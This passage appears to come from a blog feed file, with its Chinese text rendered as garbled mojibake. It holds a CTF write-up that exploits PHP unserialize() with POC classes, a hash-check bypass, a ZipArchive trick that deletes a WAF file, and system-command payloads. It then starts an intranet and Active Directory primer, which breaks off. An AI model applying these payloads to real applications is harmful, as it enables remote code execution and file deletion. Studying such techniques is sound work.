&#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;class login&#123;    public $file;    public $filename;    public $content;    public function __construct($file,$filename,$content)    &#123;        $this-&gt;file=$file;        $this-&gt;filename=$filename;        $this-&gt;content=$content;    &#125;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);            die(&#39;login success you can to open shell file!&#39;);        &#125;    &#125;&#125;class register&#123;    public function checking($username,$password)    &#123;        if($username===&#39;admin&#39;&amp;&amp;$password===&#39;admin&#39;)&#123;            die(&#39;success register admin&#39;);        &#125;else&#123;            die(&#39;please register admin &#39;);        &#125;    &#125;&#125;class Open&#123;    function open($filename, $content)&#123;        if(!file_get_contents(&#39;waf.txt&#39;))&#123;            shell($content);        &#125;else&#123;            echo file_get_contents($filename.&quot;.php&quot;);        &#125;    &#125;&#125;if($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;])))&#123;    @unserialize(base64_decode($_POST[&#39;unser&#39;]));&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010658741-eba5b190-5be1-4994-982d-2c2109ed09eb.png" alt="img"><br>è¿™é‡Œååºåˆ—åŒ–å‰æœ‰ä¸ªæ ¡éªŒï¼Œç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡</p><pre><code class="php">http://127.0.0.1/test/?a[]=1&amp;b[]=2</code></pre><p>è¯»å–ä¸‹shell.phpçš„å†…å®¹<br>æ„é€ payload:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;whoami&#39;;$a-&gt;filename = &#39;php://filter/read=convert.base64-encode/resource=shell&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>è§£ç å¾—åˆ°shell.phpçš„æºç :</p><pre><code class="php">&lt;?phpfunction shell($cmd)&#123;    if(strlen($cmd)&lt;10)&#123;        if(preg_match(&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;,$cmd))&#123;            die(&quot;NO&quot;);        &#125;else&#123;            return system($cmd);        &#125;    &#125;else&#123;        die(&#39;so long!&#39;);     &#125;&#125;</code></pre><p>shell.phpå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>ä½†æ˜¯å¦‚æœè¦æ‰§è¡Œshell.php<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666010871391-7c2b5910-4f40-4616-8ff1-6e6309df9a70.png" alt="img"><br>å¿…é¡»ä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦æƒ³åŠæ³•æŠŠå®ƒåˆ é™¤<br>æˆ‘ä»¬å¿…é¡»è¦ä½¿ç”¨åŸç”Ÿç±»ï¼Œè¿™ä¸ªåŸç”Ÿç±»è¿˜å¿…é¡»æ˜¯openæ–¹æ³•å¯ä»¥åˆ é™¤æ–‡ä»¶<br>éå†ä¸€ä¸‹:</p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;open&#39;        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011335328-c952daa5-ae18-4e62-9460-028443cb42c0.png" alt="img"><br>ZipArchiveåˆšå¥½æœ‰ä¸ªopenæ–¹æ³•å¯ä»¥æ»¡è¶³,ä¸Šæ–‡å·²ç»ä»‹ç»è¿‡äº†<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666011423047-bc1ad514-77ec-4e4b-b46b-633575e9e46f.png" alt="img"><br>ä¼ å…¥8ç›¸å½“äºé‡å†™æ–‡ä»¶<br>æœ€ç»ˆæ„é€ poc:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = 8;$a-&gt;filename = &#39;waf.txt&#39;;$a-&gt;file = new ZipArchive();echo base64_encode(serialize($a));</code></pre><pre><code class="php">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30=</code></pre><p>ä¼ å…¥åwaf.txtå°±è¢«åˆ é™¤ï¼Œæˆ‘è¿™é‡Œæ˜¯æœ¬åœ°æ­å»ºçš„ç¯å¢ƒæ‰€ä»¥ç›´æ¥å¯ä»¥çœ‹åˆ°<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012203141-9ea79c5d-767c-451e-8f16-60826fb1108f.png" alt="img"><br>æ¥ä¸‹æ¥æ„é€ pocæ‰§è¡Œå‘½ä»¤å³å¯:</p><pre><code class="php">&lt;?phpclass Open&#123;&#125;class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;    public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        &#125;else&#123;            $this-&gt;choice = new register();        &#125;    &#125;    public function __destruct() &#123;        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);    &#125;&#125;$a = new Game();$a-&gt;username = &#39;admin&#39;;$a-&gt;password = &#39;admin&#39;;$a-&gt;register = &#39;admin&#39;;$a-&gt;file=&#39;123&#39;;$a-&gt;content = &#39;type flag&#39;;$a-&gt;filename = &#39;111&#39;;$a-&gt;file = new Open();echo base64_encode(serialize($a));</code></pre><p>æˆ‘è¿™é‡Œæ˜¯ç”¨windowsç³»ç»Ÿå¤ç°çš„ï¼Œæ‰€ä»¥ä½¿ç”¨å‘½ä»¤ä¸åŒï¼Œæ€è·¯éƒ½ä¸€æ ·<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1666012717080-da919474-bae9-47a8-978b-cd5b2e4b94a1.png" alt="img"></p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://blog.csdn.net/rawrecruit/article/details/123968687">https://blog.csdn.net/rawrecruit/article/details/123968687</a><br><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a><br><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘å­¦ä¹ ç¯‡</title>
      <link href="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/"/>
      <url>/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« "><a href="#å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« " class="headerlink" title="å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« "></a>å†…ç½‘å®‰å…¨ç¬¬ä¸€ç« </h1><h2 id="å†…ç½‘åŸºç¡€çŸ¥è¯†"><a href="#å†…ç½‘åŸºç¡€çŸ¥è¯†" class="headerlink" title="å†…ç½‘åŸºç¡€çŸ¥è¯†"></a>å†…ç½‘åŸºç¡€çŸ¥è¯†</h2><p><strong>å·¥ä½œç»„</strong>:å·¥ä½œç»„ï¼ˆ Work Group)ï¼Œåœ¨ä¸€ä¸ªå¤§çš„å•ä½å†…ï¼Œå¯èƒ½æœ‰æˆç™¾ä¸Šåƒå°ç”µè„‘äº’ç›¸è¿æ¥ç»„æˆå±€åŸŸç½‘ï¼Œå®ƒä»¬éƒ½ä¼šåˆ—åœ¨â€œç½‘ç»œï¼ˆç½‘ä¸Šé‚»å±…)â€å†…ï¼Œå¦‚æœè¿™äº›ç”µè„‘ä¸åˆ†ç»„ï¼Œå¯æƒ³è€ŒçŸ¥æœ‰å¤šä¹ˆæ··ä¹±ï¼Œè¦æ‰¾ä¸€å°ç”µè„‘å¾ˆå›°éš¾ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œå°±æœ‰äº†â€œå·¥ä½œç»„â€è¿™ä¸ªæ¦‚å¿µï¼Œå°†ä¸åŒçš„ç”µè„‘ä¸€èˆ¬æŒ‰åŠŸèƒ½(æˆ–éƒ¨é—¨ï¼‰åˆ†åˆ«åˆ—å…¥ä¸åŒçš„å·¥ä½œç»„ä¸­ï¼Œå¦‚æŠ€æœ¯éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œæŠ€æœ¯éƒ¨â€å·¥ä½œç»„ä¸­ï¼Œè¡Œæ”¿éƒ¨çš„ç”µè„‘éƒ½åˆ—å…¥â€œè¡Œæ”¿éƒ¨â€å·¥ä½œç»„ä¸­ã€‚ä½ è¦è®¿é—®æŸä¸ªéƒ¨é—¨çš„èµ„æºï¼Œå°±åœ¨â€œç½‘ç»œâ€é‡Œæ‰¾åˆ°é‚£ä¸ªéƒ¨é—¨çš„å·¥ä½œç»„åï¼ŒåŒå‡»å°±å¯ä»¥çœ‹åˆ°é‚£ä¸ªéƒ¨é—¨çš„æ‰€æœ‰ç”µè„‘äº†ã€‚ç›¸æ¯”ä¸åˆ†ç»„çš„æƒ…å†µå°±æœ‰åºçš„å¤šäº†ï¼Œå°¤å…¶æ˜¯å¯¹äºå¤§å‹å±€åŸŸç½‘ç»œæ¥è¯´ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628095849118.png" alt="image-20220628095849118"></p><p><strong>åŸŸ</strong>(Domain)æ˜¯ä¸€ä¸ªæœ‰å®‰å…¨è¾¹ç•Œçš„è®¡ç®—æœºé›†åˆï¼ˆå®‰å…¨è¾¹ç•Œæ„æ€æ˜¯åœ¨ä¸¤ä¸ªåŸŸä¸­ï¼Œä¸€ä¸ªåŸŸä¸­çš„ç”¨æˆ·æ— æ³•è®¿é—®å¦ä¸€ä¸ªåŸŸä¸­çš„èµ„æºï¼‰ï¼Œå¯ä»¥ç®€å•çš„æŠŠåŸŸç†è§£æˆå‡çº§ç‰ˆçš„â€œå·¥ä½œç»„â€ï¼Œç›¸æ¯”å·¥ä½œç»„è€Œè¨€,å®ƒæœ‰ä¸€ä¸ªæ›´åŠ ä¸¥æ ¼çš„å®‰å…¨ç®¡ç†æ§åˆ¶æœºåˆ¶,å¦‚æœä½ æƒ³è®¿é—®åŸŸå†…çš„èµ„æº,å¿…é¡»æ‹¥æœ‰ä¸€ä¸ªåˆæ³•çš„èº«ä»½ç™»é™†åˆ°è¯¥åŸŸä¸­,è€Œä½ å¯¹è¯¥åŸŸå†…çš„èµ„æºæ‹¥æœ‰ä»€ä¹ˆæ ·çš„æƒé™,è¿˜éœ€è¦å–å†³äºä½ åœ¨è¯¥åŸŸä¸­çš„ç”¨æˆ·èº«ä»½ã€‚<br><strong>åŸŸæ§åˆ¶å™¨</strong>ï¼ˆDomain Controllerï¼Œç®€å†™ä¸ºDcï¼‰æ˜¯ä¸€ä¸ªåŸŸä¸­çš„ä¸€å°ç±»ä¼¼ç®¡ç†æœåŠ¡å™¨çš„è®¡ç®—æœºï¼Œç›¸å½“äºä¸€ä¸ªå•ä½çš„é—¨å«ä¸€æ ·ï¼Œå®ƒè´Ÿè´£æ¯ä¸€å°è”å…¥çš„ç”µè„‘å’Œç”¨æˆ·çš„éªŒè¯å·¥ä½œï¼ŒåŸŸå†…ç”µè„‘å¦‚æœæƒ³äº’ç›¸è®¿é—®é¦–å…ˆéƒ½æ˜¯ç»è¿‡å®ƒçš„å®¡æ ¸ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100052625.png" alt="image-20220628100052625"></p><p><strong>åŸŸçš„åˆ†ç±»:</strong></p><p><strong>å•åŸŸ</strong><br>åœ¨ä¸€èˆ¬çš„å…·æœ‰å›ºå®šåœ°ç†ä½ç½®çš„å°å…¬å¸é‡Œï¼Œå»ºç«‹ä¸€ä¸ªåŸŸå°±å¯ä»¥æ»¡è¶³æ‰€éœ€ã€‚Â·ä¸€èˆ¬åœ¨ä¸€ä¸ªåŸŸå†…è¦å»ºç«‹è‡³å°‘ä¸¤ä¸ªåŸŸæœåŠ¡å™¨ï¼Œä¸€ä¸ªä½œä¸ºDcï¼Œä¸€ä¸ªæ˜¯å¤‡ä»½DCã€‚å¦‚æœæ²¡æœ‰ç¬¬äºŒä¸ªå¤‡ä»½Dcï¼Œé‚£ä¹ˆä¸€æ—¦DCç˜«ç—ªäº†ï¼Œåˆ™åŸŸå†…çš„å…¶ä»–ç”¨æˆ·å°±ä¸èƒ½ç™»é™†è¯¥åŸŸäº†ï¼Œå› ä¸ºæ´»åŠ¨ç›®å½•çš„æ•°æ®åº“ï¼ˆåŒ…æ‹¬ç”¨æˆ·çš„å¸å·ä¿¡æ¯)æ˜¯å­˜å‚¨åœ¨DCä¸­çš„ã€‚è€Œæœ‰ä¸€å°å¤‡ä»½åŸŸæ§åˆ¶å™¨ï¼ˆBDCï¼‰ï¼Œåˆ™è‡³å°‘è¯¥åŸŸè¿˜èƒ½æ­£å¸¸ä½¿ç”¨ï¼ŒæœŸé—´æŠŠç˜«ç—ªçš„Dcæ¢å¤äº†å°±è¡Œäº†ã€‚</p><p><strong>çˆ¶åŸŸ</strong></p><p>å‡ºäºç®¡ç†åŠå…¶ä»–ä¸€äº›éœ€æ±‚ï¼Œéœ€è¦åœ¨ç½‘ç»œä¸­åˆ’åˆ†å¤šä¸ªåŸŸï¼Œç¬¬ä¸€ä¸ªåŸŸç§°ä¸ºçˆ¶åŸŸï¼Œå„åˆ†éƒ¨çš„åŸŸç§°ä¸ºè¯¥åŸŸçš„å­åŸŸã€‚<br>æ¯”å¦‚ä¸€ä¸ªå¤§å…¬å¸ï¼Œå®ƒçš„ä¸åŒåˆ†å…¬å¸åœ¨ä¸åŒçš„åœ°ç†ä½ç½®ï¼Œåˆ™éœ€çˆ¶åŸŸåŠå­åŸŸè¿™æ ·çš„ç»“æ„ã€‚<br>å¦‚æœæŠŠä¸åŒåœ°ç†ä½ç½®çš„åˆ†å…¬å¸æ”¾åœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œé‚£ä¹ˆä»–ä»¬ä¹‹é—´ä¿¡æ¯äº¤äº’ï¼ˆåŒ…æ‹¬åŒæ­¥ï¼Œå¤åˆ¶ç­‰ï¼‰æ‰€èŠ±è´¹çš„æ—¶é—´ä¼šæ¯”è¾ƒé•¿ï¼Œè€Œä¸”å ç”¨çš„å¸¦å®½ä¹Ÿæ¯”è¾ƒå¤§ã€‚(å› ä¸ºåœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®æ˜¯å¾ˆå¤šçš„ï¼Œè€Œä¸”ä¸å‹ç¼©;è€Œåœ¨åŸŸå’ŒåŸŸä¹‹é—´ï¼Œä¿¡æ¯äº¤äº’çš„æ¡ç›®ç›¸å¯¹è¾ƒå°‘ï¼Œè€Œä¸”å‹ç¼©ã€‚ï¼‰<br>è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œå°±æ˜¯å­å…¬å¸å¯ä»¥é€šè¿‡è‡ªå·±çš„åŸŸæ¥ç®¡ç†è‡ªå·±çš„èµ„æºã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯å‡ºäºå®‰å…¨ç­–ç•¥çš„è€ƒè™‘ï¼Œå› ä¸ºæ¯ä¸ªåŸŸéƒ½æœ‰è‡ªå·±ç‹¬æœ‰çš„å®‰å…¨ç­–ç•¥ã€‚æ¯”å¦‚ä¸€ä¸ªå…¬å¸çš„è´¢åŠ¡éƒ¨é—¨å¸Œæœ›èƒ½ä½¿ç”¨ç‰¹å®šçš„å®‰å…¨ç­–ç•¥(åŒ…æ‹¬å¸å·å¯†ç ç­–ç•¥ç­‰ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥å°†è´¢åŠ¡éƒ¨é—¨åšæˆä¸€ä¸ªå­åŸŸæ¥å•ç‹¬ç®¡ç†ã€‚</p><p><strong>åŸŸæ ‘</strong></p><p>åŸŸæ ‘æŒ‡è‹¥å¹²ä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„é›†åˆã€‚ä¸€ä¸ªåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸçš„å†…éƒ¨ï¼Œä¸èƒ½è®¿é—®æˆ–è€…ç®¡ç†å…¶ä»–çš„åŸŸï¼ŒäºŒä¸ªåŸŸä¹‹é—´ç›¸äº’è®¿é—®åˆ™éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»(Trust Relation)ã€‚<br>ä¿¡ä»»å…³ç³»æ˜¯è¿æ¥åœ¨åŸŸä¸åŸŸä¹‹é—´çš„æ¡¥æ¢ã€‚åŸŸæ ‘å†…çš„çˆ¶åŸŸä¸å­åŸŸä¹‹é—´ä¸ä½†å¯ä»¥æŒ‰éœ€è¦ç›¸äº’è¿›è¡Œç®¡ç†ï¼Œè¿˜å¯ä»¥è·¨ç½‘åˆ†é…æ–‡ä»¶å’Œæ‰“å°æœºç­‰è®¾å¤‡èµ„æºï¼Œä½¿ä¸åŒçš„åŸŸä¹‹é—´å®ç°ç½‘ç»œèµ„æºçš„å…±äº«ä¸ç®¡ç†ï¼Œä»¥åŠç›¸äº’é€šä¿¡å’Œæ•°æ®ä¼ è¾“ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100413944.png" alt="image-20220628100413944"></p><p><strong>åŸŸæ£®æ—</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100503104.png" alt="image-20220628100503104"></p><p><strong>DNSåŸŸåæœåŠ¡å™¨</strong>æ˜¯è¿›è¡ŒåŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€(IPaddress)è½¬æ¢çš„æœåŠ¡å™¨ã€‚<br>åœ¨åŸŸæ ‘çš„ä»‹ç»ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åŸŸæ ‘ä¸­çš„åŸŸçš„åå­—å’ŒDNSåŸŸçš„åå­—éå¸¸ç›¸ä¼¼ï¼Œå®é™…ä¸ŠåŸŸçš„åå­—å°±æ˜¯DNSåŸŸçš„åå­—ï¼Œå› ä¸ºåŸŸä¸­çš„è®¡ç®—æœºä½¿ç”¨DNSæ¥å®šä½åŸŸæ§åˆ¶å™¨å’ŒæœåŠ¡å™¨ä»¥åŠå…¶ä»–è®¡ç®—æœºã€ç½‘ç»œæœåŠ¡ç­‰ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹,æˆ‘ä»¬åœ¨å†…ç½‘æ¸—é€æ—¶å°±é€šè¿‡å¯»æ‰¾DNSæœåŠ¡å™¨æ¥å®šä½åŸŸæ§åˆ¶å™¨ï¼Œå› ä¸ºé€šå¸¸DNSæœåŠ¡å™¨å’ŒåŸŸæ§åˆ¶å™¨ä¼šå¤„åœ¨åŒä¸€å°æœºå™¨ä¸Šã€‚</p><p><strong>æ´»åŠ¨ç›®å½•</strong>ï¼ˆActive Directoryï¼‰æ˜¯åŸŸç¯å¢ƒä¸­æä¾›ç›®å½•æœåŠ¡çš„ç»„ä»¶ã€‚ç›®å½•æ˜¯ä»€ä¹ˆ?ç›®å½•å°±æ˜¯å­˜å‚¨æœ‰å…³ç½‘ç»œå¯¹è±¡ï¼ˆå¦‚ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€å…±äº«èµ„æºã€æ‰“å°æœºå’Œè”ç³»äººç­‰ï¼‰çš„ä¿¡æ¯ã€‚ç›®å½•æœåŠ¡æ˜¯å¸®åŠ©ç”¨æˆ·å¿«é€Ÿå‡†ç¡®çš„ä»ç›®å½•ä¸­æŸ¥æ‰¾åˆ°ä»–æ‰€éœ€è¦çš„ä¿¡æ¯çš„æœåŠ¡ã€‚<br>å¦‚æœå°†ä¼ä¸šçš„å†…ç½‘çœ‹æˆæ˜¯ä¸€æœ¬å­—å…¸ï¼Œé‚£ä¹ˆå†…ç½‘é‡Œçš„èµ„æºå°±æ˜¯å­—å…¸çš„å†…å®¹ï¼Œæ´»åŠ¨ç›®å½•å°±ç›¸å½“äºå­—å…¸çš„ç´¢å¼•ã€‚å³æ´»åŠ¨ç›®å½•å­˜å‚¨çš„æ˜¯ç½‘ç»œä¸­æ‰€æœ‰èµ„æºçš„å¿«æ·æ–¹å¼ï¼Œç”¨æˆ·é€šè¿‡å¯»æ‰¾å¿«æ·æ–¹å¼è€Œå®šä½èµ„æºã€‚</p><p><strong>é€»è¾‘ç»“æ„</strong></p><p>åœ¨æ´»åŠ¨ç›®å½•ä¸­ï¼Œç®¡ç†å‘˜å¯ä»¥å®Œå…¨å¿½ç•¥è¢«ç®¡ç†å¯¹è±¡çš„å…·ä½“åœ°ç†ä½ç½®ï¼Œè€Œå°†è¿™äº›å¯¹è±¡æŒ‰ç…§ä¸€å®šçš„æ–¹å¼æ”¾ç½®åœ¨ä¸åŒçš„å®¹å™¨ä¸­ã€‚ç”±äºè¿™ç§ç»„ç»‡å¯¹è±¡çš„åšæ³•ä¸è€ƒè™‘è¢«ç®¡ç†å¯¹è±¡çš„å…·ä½“åœ°ç†ä½ç½®ï¼Œè¿™ç§ç»„ç»‡æ¡†æ¶ç§°ä¸ºâ€œé€»è¾‘ç»“æ„â€ã€‚<br>æ´»åŠ¨ç›®å½•çš„é€»è¾‘ç»“æ„å°±åŒ…æ‹¬ä¸Šé¢è®²åˆ°çš„ç»„ç»‡å•å…ƒï¼ˆou)ã€åŸŸ(domain)ã€åŸŸæ ‘( tree)ã€åŸŸæ£®æ—ï¼ˆforestï¼‰ã€‚åœ¨åŸŸæ ‘å†…çš„æ‰€æœ‰åŸŸå…±äº«ä¸€ä¸ªæ´»åŠ¨ç›®å½•ï¼Œè¿™ä¸ªæ´»åŠ¨ç›®å½•å†…çš„æ•°æ®åˆ†æ•£åœ°å­˜å‚¨åœ¨å„ä¸ªåŸŸå†…ï¼Œä¸”æ¯ä¸€ä¸ªåŸŸåªå­˜å‚¨è¯¥åŸŸå†…çš„æ•°æ®ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628102316204.png" alt="image-20220628102316204"></p><p><strong>æ´»åŠ¨ç›®å½•ä¸»è¦åŠŸèƒ½</strong></p><p>å¸å·é›†ä¸­ç®¡ç†ï¼Œæ‰€æœ‰å¸å·å‡å­˜åœ¨æœåŠ¡å™¨ä¸Š,æ–¹ä¾¿å¯¹å¸å·çš„é‡å‘½ä»¤/é‡ç½®å¯†ç ã€‚<br>è½¯ä»¶é›†ä¸­ç®¡ç†ï¼Œç»Ÿä¸€æ¨é€è½¯ä»¶ï¼Œç»Ÿä¸€å®‰è£…ç½‘ç»œæ‰“å°æœºç­‰ã€‚åˆ©ç”¨è½¯ä»¶å‘å¸ƒç­–ç•¥åˆ†å‘è½¯ä»¶,å¯ä»¥è®©ç”¨æˆ·è‡ªç”±é€‰æ‹©å®‰è£…è½¯ä»¶ã€‚<br>ç¯å¢ƒé›†ä¸­ç®¡ç†ï¼Œåˆ©ç”¨ADå¯ä»¥ç»Ÿä¸€å®¢æˆ·ç«¯æ¡Œé¢,IE,TCP/IPç­‰è®¾ç½®ã€‚<br>å¢å¼ºå®‰å…¨æ€§ï¼Œç»Ÿä¸€éƒ¨ç½²æ€æ¯’è½¯ä»¶å’Œæ‰«æ¯’ä»»åŠ¡ï¼Œé›†ä¸­åŒ–ç®¡ç†ç”¨æˆ·çš„è®¡ç®—æœºæƒé™ã€ç»Ÿä¸€åˆ¶è®¢ç”¨æˆ·å¯†ç ç­–ç•¥ç­‰ï¼Œå¯ç›‘æ§ç½‘ç»œï¼Œèµ„æ–™ç»Ÿä¸€ç®¡ç†ã€‚æ›´å¯é ï¼Œæ›´å°‘çš„å®•æœºæ—¶é—´ã€‚å¦‚:åˆ©ç”¨ADæ§åˆ¶ç”¨æˆ·è®¿é—®æƒé™ï¼Œåˆ©ç”¨ç¾¤é›†ã€è´Ÿè½½å‡è¡¡ç­‰æŠ€æœ¯å¯¹æ–‡ä»¶æœåŠ¡å™¨è¿›è¡Œå®¹ç¾è®¾å®šï¼Œæ›´å¯é ï¼Œå®•æœºæ—¶é—´ å°‘ã€‚æ´»åŠ¨ç›®å½•ä¸ºMicrosoftç»Ÿä¸€ç®¡ç†çš„åŸºç¡€å¹³å°ï¼Œå…¶å®ƒisa,exchange,smsç­‰æœåŠ¡éƒ½ä¾èµ–äºè¿™ä¸ªåŸºç¡€å¹³å°ã€‚</p><p><strong>ADå’ŒDCåŒºåˆ«</strong></p><p>å¦‚æœç½‘ç»œè§„æ¨¡è¾ƒå¤§ï¼Œæˆ‘ä»¬å°±ä¼šè€ƒè™‘æŠŠç½‘ç»œä¸­çš„ä¼—å¤šå¯¹è±¡:è®¡ç®—æœºã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€æ‰“å°æœºã€å…±äº«æ–‡ä»¶ç­‰ï¼Œåˆ†é—¨åˆ«ç±»ã€äº•ç„¶æœ‰åºåœ°æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“ä¸­ï¼Œå¹¶åšå¥½æ£€ç´¢ä¿¡æ¯ï¼Œä»¥åˆ©äºæŸ¥æ‰¾ã€ç®¡ç†å’Œä½¿ç”¨è¿™äº›å¯¹è±¡ï¼ˆèµ„æºï¼‰ã€‚è¿™ä¸ªæœ‰å±‚æ¬¡ç»“æ„çš„æ•°æ®åº“ï¼Œå°±æ˜¯æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œç®€ç§°ADåº“ã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æŠŠè¿™ä¸ªæ•°æ®åº“æ”¾åœ¨å“ªå°è®¡ç®—æœºä¸Šå‘¢?è§„å®šæ˜¯è¿™æ 